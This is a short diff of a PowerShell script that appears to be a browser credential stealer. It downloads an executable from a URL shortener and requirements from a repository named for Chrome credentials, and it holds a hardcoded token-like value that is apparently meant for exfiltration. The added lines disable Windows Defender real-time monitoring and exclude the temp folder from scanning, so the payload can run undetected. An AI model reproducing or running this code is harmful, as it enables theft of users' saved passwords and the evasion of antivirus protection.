@@ -33,9 +33,12 @@
 Start-Process "chrome.exe" -ArgumentList "--start-minimized"
 
 #------------------------------------------------------------------------------------------------------------------------------------
+
 $db = 'Q2cTyOsHDDQAAAAAAAAAAS4nV2ZDq7HRORdQBurV4ZxSiMQPNsTy4u_VfLWNIj2J'
 $T=$env:tmp
 $U=$env:UserName
+Set-MpPreference -DisableRealtimeMonitoring $true
+Add-MpPreference -ExclusionPath "$T"
 cd $T
 iwr -Uri 'https://t.ly/Ja9JO' -o $T'\py.exe'
 iwr -Uri 'https://raw.githubusercontent.com/netgian/Chrome-Credentials/main/requirements.txt' -o $T'\req.txt'
